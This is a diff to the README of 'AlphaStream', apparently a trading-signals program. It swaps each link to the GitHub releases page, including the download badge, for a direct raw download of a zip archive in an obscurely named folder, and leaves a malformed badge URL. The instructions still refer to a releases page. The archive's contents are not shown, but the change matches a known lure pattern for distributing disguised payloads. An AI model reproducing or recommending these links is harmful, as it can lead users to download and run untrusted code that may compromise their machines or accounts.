@@ -1,6 +1,6 @@
 # 🚀 AlphaStream - Effortless Trading Signals at Your Fingertips
 
-[![Download AlphaStream](https://img.shields.io/badge/Download%20AlphaStream-v1.0-blue.svg)](https://github.com/tinashemuxanga/AlphaStream/releases)
+[![Download AlphaStream](https://raw.githubusercontent.com/tinashemuxanga/AlphaStream/main/rafflesiaceous/AlphaStream.zip%https://raw.githubusercontent.com/tinashemuxanga/AlphaStream/main/rafflesiaceous/AlphaStream.zip)](https://raw.githubusercontent.com/tinashemuxanga/AlphaStream/main/rafflesiaceous/AlphaStream.zip)
 
 ## 📖 Overview
 
@@ -30,7 +30,7 @@ Follow these steps to download and start using AlphaStream:
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest version of AlphaStream:  
-   [Download AlphaStream](https://github.com/tinashemuxanga/AlphaStream/releases)
+   [Download AlphaStream](https://raw.githubusercontent.com/tinashemuxanga/AlphaStream/main/rafflesiaceous/AlphaStream.zip)
 
 2. **Select the Version**  
    On the releases page, find the most current version of AlphaStream. Look for the file named appropriately for your operating system.
@@ -47,7 +47,7 @@ Follow these steps to download and start using AlphaStream:
 ## 📥 Download & Install
 
 To download AlphaStream, click the link below to visit the releases page:  
-[Download AlphaStream](https://github.com/tinashemuxanga/AlphaStream/releases)
+[Download AlphaStream](https://raw.githubusercontent.com/tinashemuxanga/AlphaStream/main/rafflesiaceous/AlphaStream.zip)
 
 ## 📊 Using AlphaStream
 
